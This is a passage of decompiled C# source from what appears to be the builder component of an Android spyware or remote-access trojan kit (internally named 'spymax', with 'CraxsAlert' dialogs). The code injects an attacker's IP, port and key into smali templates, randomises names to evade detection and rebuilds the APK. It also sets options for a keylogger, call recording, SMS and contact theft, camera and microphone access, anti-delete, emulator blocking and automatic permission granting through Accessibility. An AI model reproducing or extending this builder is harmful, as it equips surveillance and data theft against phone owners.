										.Replace("stub7", pack2)
										.Replace("j1j2j3j4j5j6", NresoString0)
										.Replace("c1c2c3c4c5c6", NresoString1)
										.Replace("z1z2z3z4z5z6", NresoString2)
										.Replace("f1f2f3f4f5f6", NresoString3)
										.Replace("h1h2h3h4h5h6", NresoString4)
										.Replace("t1t2t3t4t5t6", NresoString5)
										.Replace("n1n2n3n4n5n6", NresoString6)
										.Replace("i1i2i3i4i5i6", NresoString7)
										.Replace("k1k2k3k4k5k6", NresoString8)
										.Replace("o1o2o3o4o5o6", NresoString9)
										.Replace("u1u2u3u4u5u6", NresoString10)
										.Replace("e1e2e3e4e5e6", NresoString11)
										.Replace("y1y2y3y4y5y6", NresoString12)
										.Replace("b1b2b3b4b5b6", Napp_reso0)
										.Replace("d1d2d3d4d5d6", Ndraw_ico)
										.Replace("x1x2x3x4x5x6", Ndraw_notifi)
										.Replace("q1q2q3q4q5q6", NwebXML)
										.Replace("s1s2s3s4s5s6", NnotifiXML), path: fileInfo4.FullName);
								}
							}
							catch (Exception projectError9)
							{
								ProjectData.SetProjectError(projectError9);
								Thread.Sleep(_Time);
								ProjectData.ClearProjectError();
								continue;
							}
							break;
						}
						while (true)
						{
							try
							{
								string text25;
								while (true)
								{
									text25 = folder_apktool + "\\temp\\smali\\spymax\\stub7\\activz\\tolziz";
									if (Directory.Exists(text25))
									{
										break;
									}
									Thread.Sleep(_Time);
								}
								int num6 = 1;
								do
								{
									string text26 = RandommMadv2(10, 15);
									File.WriteAllText(text25 + "\\" + text26 + ".smali", text.Replace("spymax", pack1).Replace("stub7", pack2).Replace("[MYNAME]", "activz/tolziz/" + text26));
									num6++;
								}
								while (num6 <= 10);
								DirectoryInfo directoryInfo5 = new DirectoryInfo(text25);
								FileInfo[] files5 = directoryInfo5.GetFiles("*.smali");
								LogB("Phase 5\r\n---------");
								FileInfo[] array5 = files5;
								foreach (FileInfo fileInfo5 in array5)
								{
									string text27 = File.ReadAllText(fileInfo5.FullName);
									File.WriteAllText(contents: (Operators.CompareString(fileInfo5.Name.ToLower(), "buildconfig.smali", TextCompare: false) != 0) ? text27.Replace("spymax", pack1).Replace("stub7", pack2).Replace("ClassGen0", NClassGen0)
										.Replace("ClassGen1", NClassGen1)
										.Replace("ClassGen2", NClassGen2)
										.Replace("ClassGen3", NClassGen3)
										.Replace("ClassGen4", NClassGen4)
										.Replace("ClassGen5", NClassGen5)
										.Replace("ClassGen6", NClassGen6)
										.Replace("ClassGen8", NClassGen8)
										.Replace("ClassGen9", NClassGen9)
										.Replace("ClassGen10", NClassGen10)
										.Replace("ClassGen11", NClassGen11)
										.Replace("ClassGen12", NClassGen12)
										.Replace("ClassGen13", NClassGen13)
										.Replace("ClassGen14", NClassGen14)
										.Replace("activz", Nactivz)
										.Replace("servziz", Nservziz)
										.Replace("tolziz", Ntolziz)
										.Replace("brodatz", Nbrodatz)
										.Replace("_ask_battary_", N_ask_battary_)
										.Replace("_ask_draw_", N_ask_draw_)
										.Replace("_sc_fb_", N_sc_fb_)
										.Replace("_news_g_", N_news_g_)
										.Replace("_strt_view_", N_strt_view_)
										.Replace("_scctrl_", N_scctrl_)
										.Replace("_access_ask_", N_access_ask_)
										.Replace("_cap_sc_", N_cap_sc_)
										.Replace("_trns_g_", N_trns_g_)
										.Replace("_ask_prim_", N_ask_prim_)
										.Replace("_engine_wrk_", N_engine_wrk_)
										.Replace("_skin_cls_", N_skin_cls_)
										.Replace("_update_app_", N_update_app_)
										.Replace("_callr_lsnr_", N_callr_lsnr_)
										.Replace("_clss_loder_", N_clss_loder_)
										.Replace("_excut_meth_", N_excut_meth_)
										.Replace("_run_comnd_", N_run_comnd_)
										.Replace("_get_me_fil_", N_get_me_fil_)
										.Replace("_srv_worker_", N_srv_worker_)
										.Replace("j1j2j3j4j5j6", NresoString0)
										.Replace("c1c2c3c4c5c6", NresoString1)
										.Replace("z1z2z3z4z5z6", NresoString2)
										.Replace("f1f2f3f4f5f6", NresoString3)
										.Replace("h1h2h3h4h5h6", NresoString4)
										.Replace("t1t2t3t4t5t6", NresoString5)
										.Replace("n1n2n3n4n5n6", NresoString6)
										.Replace("i1i2i3i4i5i6", NresoString7)
										.Replace("k1k2k3k4k5k6", NresoString8)
										.Replace("o1o2o3o4o5o6", NresoString9)
										.Replace("u1u2u3u4u5u6", NresoString10)
										.Replace("e1e2e3e4e5e6", NresoString11)
										.Replace("y1y2y3y4y5y6", NresoString12)
										.Replace("b1b2b3b4b5b6", Napp_reso0)
										.Replace("suffix", flavor)
										.Replace("d1d2d3d4d5d6", Ndraw_ico)
										.Replace("x1x2x3x4x5x6", Ndraw_notifi)
										.Replace("q1q2q3q4q5q6", NwebXML)
										.Replace("s1s2s3s4s5s6", NnotifiXML)
										.Replace("key.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(KEY)))
										.Replace("host.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(ip)))
										.Replace("port.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(ports)))
										.Replace("[CYPHER_FUT0EX]", "==Acascvsrgbdsrthbsrhtrdtaefergs")
										.Replace("[CYPHER_FUT1EX]", "==ACSDEWVareaergeafsv")
										.Replace("[CYPHER_FUT2EX]", "==aadvsarsaerfaerAESVSEr")
										.Replace("[CYPHER_VICTIM]", namevictim)
										.Replace("[TYPE-HIDE]", THETYPE)
										.Replace("skin.info", FAKEAPPlink)
										.Replace("USE-SUPER", isuper)
										.Replace("[NO_OXA]", isAOX)
										.Replace("USE-AUTOUL", isautounlock)
										.Replace("USE-DATAUSAGE", isnetwork)
										.Replace("USE-ONECAP", iscaponce)
										.Replace("[NAME>LNK>ID!]", MonitorPack)
										.Replace("[TRAK-IT]", trackerlist)
										.Replace("USE-BIND", isBind)
										.Replace("USE-SKIP", isskipreinstall)
										.Replace("USE-SCREENON", iskeepscreen)
										.Replace("USE-BLOCKP", isHideprims)
										.Replace("USE-ADMIN", isadmin)
										.Replace("USE-AUTOS", isautostart)
										.Replace("[SS]", Prim_sendsms)
										.Replace("[RC]", Prim_recordcalls)
										.Replace("[SW]", Prim_wallpaper)
										.Replace("[RS]", Prim_readsms)
										.Replace("[RCG]", Prim_calllog)
										.Replace("[CRC]", Prim_readcontact)
										.Replace("[GA]", Prim_readacounts)
										.Replace("[CA]", Prim_camera)
										.Replace("[MC]", Prim_microphone)
										.Replace("[LOC1]", Prim_loacation1)
										.Replace("[LOC2]", Prim_loacation2)
										.Replace("[LOC3]", Prim_loacation3)
										.Replace("[CL]", Prim_callphone)
										.Replace("USE-QUICK", isQuick)
										.Replace("USE-DRAW", isDrawing)
										.Replace("USE-NOTIFI", isnotifi)
										.Replace("_isequel_mth_", "helpscanintnum")
										.Replace("_exit_meth_", new_exit_mth)
										.Replace("_wifipolc_meth_", new_wifipolc)
										.Replace("_formtpakt_methd_", new_formatpacket)
										.Replace("_DZIP_meth_", new_dzip)
										.Replace("_Getbyte_meth_", new_getbyte)
										.Replace("_D_BASE64_", new_base_mth)
										.Replace("_getstr_meth_", new_getstr)
										.Replace("_CZIP_meth_", new_czip)
										.Replace("_inst_bnd_", new_inst)
										.Replace("_strt_con_", new_strt_con_)
										.Replace("[USE-REC]", UseRecorder)
										.Replace("[com.app.instll", "com.appd.instll.load")
										.Replace("_fist_inf_", new_fist_inf_)
										.Replace("_new_con_", new_new_con_)
										.Replace("trg.trgtapp.trg", TheTarget)
										.Replace("[delayacess]", delayaccesstext.Text)
										.Replace("_send_it_", new_send_it_)
										.Replace("_Reblace_", new_Reblace_)
										.Replace("_runn_srv_", new_runn_srv_)
										.Replace("[off_keylog]", OFFKEYLOG)
										.Replace("[NO_EMUALTOR]", ANTIEMO)
										.Replace("_NOTIFI_TITLE_", NOTIFI_TITLE)
										.Replace("_NOTIFI_MSG_", NOTIFI_MSG)
										.Replace("_randomS_shit_", RandommClass(100, 200))
										.Replace("[RANDOM-STRING]", NEWRANDOM)
										.Replace("[CYPHER_FUT3EX]", "0000") : text27.Replace("payload", payload).Replace("suffix", flavor).Replace("spymax", pack1)
										.Replace("stub7", pack2)
										.Replace("j1j2j3j4j5j6", NresoString0)
										.Replace("c1c2c3c4c5c6", NresoString1)
										.Replace("z1z2z3z4z5z6", NresoString2)
										.Replace("f1f2f3f4f5f6", NresoString3)
										.Replace("h1h2h3h4h5h6", NresoString4)
										.Replace("t1t2t3t4t5t6", NresoString5)
										.Replace("n1n2n3n4n5n6", NresoString6)
										.Replace("i1i2i3i4i5i6", NresoString7)
										.Replace("k1k2k3k4k5k6", NresoString8)
										.Replace("o1o2o3o4o5o6", NresoString9)
										.Replace("u1u2u3u4u5u6", NresoString10)
										.Replace("e1e2e3e4e5e6", NresoString11)
										.Replace("y1y2y3y4y5y6", NresoString12)
										.Replace("b1b2b3b4b5b6", Napp_reso0)
										.Replace("d1d2d3d4d5d6", Ndraw_ico)
										.Replace("x1x2x3x4x5x6", Ndraw_notifi)
										.Replace("q1q2q3q4q5q6", NwebXML)
										.Replace("s1s2s3s4s5s6", NnotifiXML), path: fileInfo5.FullName);
								}
							}
							catch (Exception projectError10)
							{
								ProjectData.SetProjectError(projectError10);
								Thread.Sleep(_Time);
								ProjectData.ClearProjectError();
								continue;
							}
							break;
						}
						try
						{
							Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(folder_apktool + "\\temp\\smali\\spymax\\stub7\\activz\\servziz", Nservziz);
							Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(folder_apktool + "\\temp\\smali\\spymax\\stub7\\activz\\tolziz", Ntolziz);
							Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(folder_apktool + "\\temp\\smali\\spymax\\stub7\\activz\\brodatz", Nbrodatz);
							Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(folder_apktool + "\\temp\\smali\\spymax\\stub7\\activz", Nactivz);
							Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(folder_apktool + "\\temp\\smali\\spymax\\stub7", pack2);
							Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(folder_apktool + "\\temp\\smali\\spymax", pack1);
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							Interaction.MsgBox(ex2.Message);
							ProjectData.ClearProjectError();
						}
						while (true)
						{
							try
							{
								while (!File.Exists(path5))
								{
									Thread.Sleep(_Time);
								}
								string contents8 = File.ReadAllText(path5).Replace("j1j2j3j4j5j6", NresoString0).Replace("c1c2c3c4c5c6", NresoString1)
									.Replace("z1z2z3z4z5z6", NresoString2)
									.Replace("CYPHER_PATCH", namepatch)
									.Replace("f1f2f3f4f5f6", NresoString3)
									.Replace("h1h2h3h4h5h6", NresoString4)
									.Replace("t1t2t3t4t5t6", NresoString5)
									.Replace("n1n2n3n4n5n6", NresoString6)
									.Replace("i1i2i3i4i5i6", NresoString7)
									.Replace("k1k2k3k4k5k6", NresoString8)
									.Replace("o1o2o3o4o5o6", NresoString9)
									.Replace("u1u2u3u4u5u6", NresoString10)
									.Replace("e1e2e3e4e5e6", NresoString11)
									.Replace("y1y2y3y4y5y6", NresoString12)
									.Replace("b1b2b3b4b5b6", Napp_reso0)
									.Replace("d1d2d3d4d5d6", Ndraw_ico)
									.Replace("x1x2x3x4x5x6", Ndraw_notifi)
									.Replace("q1q2q3q4q5q6", NwebXML)
									.Replace("s1s2s3s4s5s6", NnotifiXML);
								File.WriteAllText(path5, contents8);
							}
							catch (Exception projectError11)
							{
								ProjectData.SetProjectError(projectError11);
								Thread.Sleep(_Time);
								ProjectData.ClearProjectError();
								continue;
							}
							break;
						}
						while (true)
						{
							try
							{
								while (!File.Exists(text2))
								{
									Thread.Sleep(_Time);
								}
								MyProject.Computer.FileSystem.RenameFile(text2, NwebXML + ".xml");
							}
							catch (Exception projectError12)
							{
								ProjectData.SetProjectError(projectError12);
								Thread.Sleep(_Time);
								ProjectData.ClearProjectError();
								continue;
							}
							break;
						}
						while (true)
						{
							try
							{
								while (!File.Exists(text3))
								{
									Thread.Sleep(_Time);
								}
								MyProject.Computer.FileSystem.RenameFile(text3, NnotifiXML + ".xml");
							}
							catch (Exception projectError13)
							{
								ProjectData.SetProjectError(projectError13);
								Thread.Sleep(_Time);
								ProjectData.ClearProjectError();
								continue;
							}
							break;
						}
						vulTrack = 80;
						try
						{
						}
						catch (Exception projectError14)
						{
							ProjectData.SetProjectError(projectError14);
							ProjectData.ClearProjectError();
						}
						NewLateBinding.LateCall(NewLateBinding.LateGet(CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[1] { "apktool b temp" }, null, null, null, IgnoreReturn: true);
						break;
					}
					catch (Exception projectError15)
					{
						ProjectData.SetProjectError(projectError15);
						Thread.Sleep(_Time);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					Thread.Sleep(_Time);
				}
			}
		}
	}

	public void MoveRandomFile(string from, string to)
	{
		if (_0024STATIC_0024MoveRandomFile_00242021EE_0024r_0024Init == null)
		{
			Interlocked.CompareExchange(ref _0024STATIC_0024MoveRandomFile_00242021EE_0024r_0024Init, new StaticLocalInitFlag(), null);
		}
		bool lockTaken = false;
		try
		{
			Monitor.Enter(_0024STATIC_0024MoveRandomFile_00242021EE_0024r_0024Init, ref lockTaken);
			if (_0024STATIC_0024MoveRandomFile_00242021EE_0024r_0024Init.State == 0)
			{
				_0024STATIC_0024MoveRandomFile_00242021EE_0024r_0024Init.State = 2;
				_0024STATIC_0024MoveRandomFile_00242021EE_0024r = new Random();
			}
			else if (_0024STATIC_0024MoveRandomFile_00242021EE_0024r_0024Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			_0024STATIC_0024MoveRandomFile_00242021EE_0024r_0024Init.State = 1;
			if (lockTaken)
			{
				Monitor.Exit(_0024STATIC_0024MoveRandomFile_00242021EE_0024r_0024Init);
			}
		}
		FileInfo[] files = new DirectoryInfo(from).GetFiles();
		FileInfo fileInfo = files[_0024STATIC_0024MoveRandomFile_00242021EE_0024r.Next(0, checked(files.Count() - 1))];
		File.Move(fileInfo.FullName, fileInfo.FullName.Replace(from, to));
	}

	public void MoveRandomDIR(string from, string to)
	{
		if (_0024STATIC_0024MoveRandomDIR_00242021EE_0024r_0024Init == null)
		{
			Interlocked.CompareExchange(ref _0024STATIC_0024MoveRandomDIR_00242021EE_0024r_0024Init, new StaticLocalInitFlag(), null);
		}
		bool lockTaken = false;
		try
		{
			Monitor.Enter(_0024STATIC_0024MoveRandomDIR_00242021EE_0024r_0024Init, ref lockTaken);
			if (_0024STATIC_0024MoveRandomDIR_00242021EE_0024r_0024Init.State == 0)
			{
				_0024STATIC_0024MoveRandomDIR_00242021EE_0024r_0024Init.State = 2;
				_0024STATIC_0024MoveRandomDIR_00242021EE_0024r = new Random();
			}
			else if (_0024STATIC_0024MoveRandomDIR_00242021EE_0024r_0024Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			_0024STATIC_0024MoveRandomDIR_00242021EE_0024r_0024Init.State = 1;
			if (lockTaken)
			{
				Monitor.Exit(_0024STATIC_0024MoveRandomDIR_00242021EE_0024r_0024Init);
			}
		}
		DirectoryInfo[] directories = new DirectoryInfo(from).GetDirectories();
		DirectoryInfo directoryInfo = directories[_0024STATIC_0024MoveRandomDIR_00242021EE_0024r.Next(0, checked(directories.Count() - 1))];
		Directory.Move(directoryInfo.FullName, directoryInfo.FullName.Replace(from, to));
	}

	private void LogB(string Str)
	{
		if (base.InvokeRequired)
		{
			string[] args = new string[1] { Str };
			Invoke(new Action<string>(LogB), args);
		}
		else
		{
			TextBox1.AppendText("\r\n-> " + Str);
		}
	}

	private void LOGEND(string Str)
	{
		if (base.InvokeRequired)
		{
			string[] args = new string[1] { Str };
			Invoke(new Action<string>(LOGEND), args);
		}
		else
		{
			TextBox1.AppendText(Str);
		}
	}

	private void Close_cmd()
	{
		try
		{
			Application.ExitThread();
			NewLateBinding.LateCall(CMD, null, "CancelOutputRead", new object[0], null, null, null, IgnoreReturn: true);
			NewLateBinding.LateCall(CMD, null, "CancelErrorRead", new object[0], null, null, null, IgnoreReturn: true);
			NewLateBinding.LateCall(CMD, null, "Kill", new object[0], null, null, null, IgnoreReturn: true);
			NewLateBinding.LateCall(CMD, null, "Close", new object[0], null, null, null, IgnoreReturn: true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ex()
	{
		try
		{
			Close_cmd();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		finally
		{
		}
	}

	private void KillA(bool first)
	{
		try
		{
			Process.GetProcessesByName("java")[0].Kill();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process.GetProcessesByName("cmd")[0].Kill();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public string HMI()
	{
		return GVSNAME().ToString();
	}

	private void saveAll()
	{
		MySettingsProperty.Settings.build_text_name_victim = TextNameVictim.Text;
		MySettingsProperty.Settings.build_text_name_patch = TextNamePatch.Text;
		MySettingsProperty.Settings.build_text_version = TextVersion.Text;
		MySettingsProperty.Settings.build_text_sleep = Conversions.ToInteger("0");
		MySettingsProperty.Settings.build_text_port = Conversions.ToInteger(po.Text);
		MySettingsProperty.Settings.build_Checked_hide = CheckHide.Checked;
		MySettingsProperty.Settings.build_Checked_doze = CheckDoze.Checked;
		MySettingsProperty.Settings.build_Checked_icon = CheckIconPatch.Checked;
		MySettingsProperty.Settings.build_path_icon = iconPatch;
		MySettingsProperty.Settings.BIND_Path = BIND_Path;
		MySettingsProperty.Settings.BIND_EX = BIND_EX;
		MySettingsProperty.Settings.intent = intent_;
		string build_DGV_list = TextIP.Text + ":" + po.Text;
		MySettingsProperty.Settings.build_DGV_list = build_DGV_list;
		MySettingsProperty.Settings.Save();
	}

	internal string GVSNAME()
	{
		ManagementObject managementObject = new ManagementObject(string.Format("win32_logicaldisk.deviceid=\"{0}:\"", "C"));
		managementObject.Get();
		return managementObject[Codes.AES_Decrypt("8tqSUqXFSzzZ4A7ikUbVogUwXcIXSn1opihYRqEbX0o=", "Timer1")].ToString();
	}

	private void Build_Closing(object sender, CancelEventArgs e)
	{
		if (TiMAT.Enabled)
		{
			TiMAT.Enabled = false;
		}
		base.DialogResult = DialogResult.Cancel;
	}

	private void TextVersion_KeyPress(object sender, KeyPressEventArgs e)
	{
	}

	private void TextVersion_KeyDown(object sender, KeyEventArgs e)
	{
	}

	private void TextFlavor_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Back)
		{
			keyback = true;
		}
		else
		{
			keyback = false;
		}
	}

	private void sleep_TextChanged(object sender, EventArgs e)
	{
		TimeSpan timeSpan = TimeSpan.FromMilliseconds(0.0);
		string text = string.Empty;
		if (timeSpan.Days != 0)
		{
			text = text + "Days " + Conversions.ToString(timeSpan.Days) + "\r\n";
		}
		if (timeSpan.Hours != 0)
		{
			text = text + "Hours:" + Conversions.ToString(timeSpan.Hours) + "\r\n";
		}
		if (timeSpan.Minutes != 0)
		{
			text = text + "Minutes:" + Conversions.ToString(timeSpan.Minutes) + "\r\n";
		}
		if (timeSpan.Seconds != 0)
		{
			text = text + "Seconds:" + Conversions.ToString(timeSpan.Seconds) + "\r\n";
		}
		if (timeSpan.Milliseconds != 0)
		{
			text = text + "Millis " + Conversions.ToString(timeSpan.Milliseconds) + "\r\n";
		}
	}

	private void b_del_Click(object sender, EventArgs e)
	{
	}

	private void btnUp_Click(object sender, EventArgs e)
	{
		Rowinsert(isDown: false);
	}

	private void btnDown_Click(object sender, EventArgs e)
	{
		Rowinsert(isDown: true);
	}

	private void Rowinsert(bool isDown)
	{
	}

	private void Build_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			try
			{
				try
				{
					if (tracklist.Items.Count > 0)
					{
						if (MySettingsProperty.Settings.ListBoxTracker == null)
						{
							MySettingsProperty.Settings.ListBoxTracker = new StringCollection();
						}
						if (MySettingsProperty.Settings.ListBoxTracker != null)
						{
							MySettingsProperty.Settings.ListBoxTracker.Clear();
						}
						MySettingsProperty.Settings.ListBoxTracker.AddRange(tracklist.Items.OfType<string>().ToArray());
						MySettingsProperty.Settings.Save();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (listmonitor.Items.Count > 0)
				{
					if (MySettingsProperty.Settings.ListBoxItems == null)
					{
						MySettingsProperty.Settings.ListBoxItems = new StringCollection();
					}
					if (MySettingsProperty.Settings.ListBoxItems != null)
					{
						MySettingsProperty.Settings.ListBoxItems.Clear();
					}
					MySettingsProperty.Settings.ListBoxItems.AddRange(listmonitor.Items.OfType<string>().ToArray());
					MySettingsProperty.Settings.Save();
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			MySettingsProperty.Settings.NotifiTitle = Nottitle.Text;
			MySettingsProperty.Settings.NotifiText = Notmsg.Text;
			MySettingsProperty.Settings.bodytext = logbodytext.Text;
			MySettingsProperty.Settings.accessdiscribe = dscriptext.Text;
			MySettingsProperty.Settings.Save();
			try
			{
				MySettingsProperty.Settings.inj_thost = TextIP.Text;
				MySettingsProperty.Settings.Save();
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			if (File.Exists(folder_apktool + "\\temp.apk"))
			{
				File.Delete(folder_apktool + "\\temp.apk");
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		KillA(first: false);
	}

	private void Panel1_Paint(object sender, PaintEventArgs e)
	{
	}

	private void Combotype_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (Operators.CompareString(combotype.Text, "Custom", TextCompare: false) == 0)
		{
			if (RegistryHandler.getwtipanti() == null)
			{
				RegistryHandler.settipanti("done");
				Codes.MyMsgBox("Tip", "in order to make anti-delete work well , use the same app name from page 1 (info)", useno: false, Resources.information48px);
			}
			fakepanel.Enabled = true;
			if (!string.IsNullOrEmpty(TextNamePatch.Text))
			{
				Textfakename.Text = TextNamePatch.Text;
			}
			CraxsAlert.Showinformation("in order to make anti-delete work well , use same app name from page 1 (info)");
		}
		else
		{
			fakepanel.Enabled = false;
			Textfakename.Text = "";
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		TextPackage.Text = randmid[rnd.Next(0, randmid.Length)] + "." + randmid[rnd.Next(0, randmid.Length)] + "." + randmid[rnd.Next(0, randmid.Length)];
	}

	private void DrakeUIAvatar1_Click(object sender, EventArgs e)
	{
	}

	private void DrakeUIAvatar2_Click(object sender, EventArgs e)
	{
	}

	private void TextBox2_TextChanged(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(TextSize.Text))
		{
			CraxsAlert.Showinformation("Only Enter Numbers");
			TextSize.Text = "30";
		}
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		logtitletext.Text = "Accessibility Service";
		logbodytext.Text = "This App Request Accessibility Service:\r\n• Click on Enable\r\n• Go to Downloaded Service\r\n• Enable [MY-NAME]";
		logbtntext.Text = "Enable";
	}

	private void Panel3_Paint(object sender, PaintEventArgs e)
	{
		e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
		Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
		if (RectInputText1.Count > 0)
		{
			foreach (Rectangle item in RectInputText1)
			{
				if (item.Width > 0)
				{
					e.Graphics.FillRectangle(new SolidBrush(defaultColor_Foreground), item);
				}
			}
		}
		Color color = Color.FromArgb(150, SpySettings.DefaultColor_Foreground.R, SpySettings.DefaultColor_Foreground.G, SpySettings.DefaultColor_Foreground.B);
		Pen pen = new Pen(color, 1f);
		Rectangle rect = checked(new Rectangle(0, 0, Panel3.Width - 1, Panel3.Height - 1));
		e.Graphics.DrawRectangle(pen, rect);
	}

	private void CheckAllPrims_CheckedChanged(object sender, EventArgs e)
	{
		if (CheckAllPrims.Checked)
		{
			foreach (object item in comboproms.Items)
			{
				object objectValue = RuntimeHelpers.GetObjectValue(item);
				Primslist.Items.Add(RuntimeHelpers.GetObjectValue(objectValue));
			}
			return;
		}
		Primslist.Items.Clear();
	}

	private void Addactiv_Click(object sender, EventArgs e)
	{
	}

	private void Removeactiv_Click(object sender, EventArgs e)
	{
	}

	private void Label33_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "1- only request file manager permission while installing apk\r\n2- you can request permissions Later from Manager > Permissions\r\n3- if this option enabled super mod will be ignored\r\n4- Better with draw over apps";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explaintoolstext.Text = inputtext;
	}

	private void Label33_MouseLeave(object sender, EventArgs e)
	{
		explaintoolstext.Text = "";
	}

	private void Label35_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "this permission is required only if super mod is off";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explaintoolstext.Text = inputtext;
	}

	private void Label35_MouseLeave(object sender, EventArgs e)
	{
		explaintoolstext.Text = "";
	}

	private void CheckQuick_CheckedChanged(object sender, EventArgs e)
	{
		if (CheckQuick.Checked)
		{
			CheckRecord.Checked = true;
			CheckRecord.Refresh();
			checkkeyloger.Checked = true;
			checkkeyloger.Refresh();
			CheckDraw.Checked = true;
			CheckDraw.Refresh();
		}
	}

	private void Button4_Click(object sender, EventArgs e)
	{
		if (numberrandomer == null)
		{
			numberrandomer = new Random();
		}
		TextVersion.Text = numberrandomer.Next(1, 99) + "." + numberrandomer.Next(1, 99) + "." + numberrandomer.Next(1, 99) + "." + numberrandomer.Next(1, 99);
	}

	private void CheckQuick_CheckedChanged(object sender, MouseEventArgs e)
	{
		explaintoolstext.Text = "";
		if (Checksuper.Checked)
		{
			Codes.MyMsgBox("info", "this option can't be used with Super Mod", useno: false, Resources.information48px);
			CheckQuick.Checked = false;
		}
	}

	private void Label14_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "if client is not connected , save the keystrokes on the phone , you can check this keystrokes using keylogger monitor";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explaintoolstext.Text = inputtext;
	}

	private void Label14_MouseLeave(object sender, EventArgs e)
	{
		explaintoolstext.Text = "";
	}

	private void Label16_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "make the app only run on real phones , and block emulators";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explaintoolstext.Text = inputtext;
	}

	private void Delayaccesstext_TextChanged(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(TextSize.Text))
		{
			CraxsAlert.Showinformation("Only Enter Numbers");
			TextSize.Text = "15";
		}
	}

	private void Label6_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "Request Accessibility services , which Allows ( anti delete + control screen + auto granting permissions + screen Reader + and more ...)";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explaintoolstext.Text = inputtext;
	}

	private void Label6_MouseLeave(object sender, EventArgs e)
	{
		explaintoolstext.Text = "";
	}

	private void Label34_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "some phones such as oppo,vivo,huawei , request special permission called auto start , to keeps the app running in background";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explaintoolstext.Text = inputtext;
	}

	private void Label34_MouseLeave(object sender, EventArgs e)
	{
		explaintoolstext.Text = "";
	}

	private void Label38_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "if supre mod enable the app will automatically click allow on all permissions , this options hide phone screen while granting";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
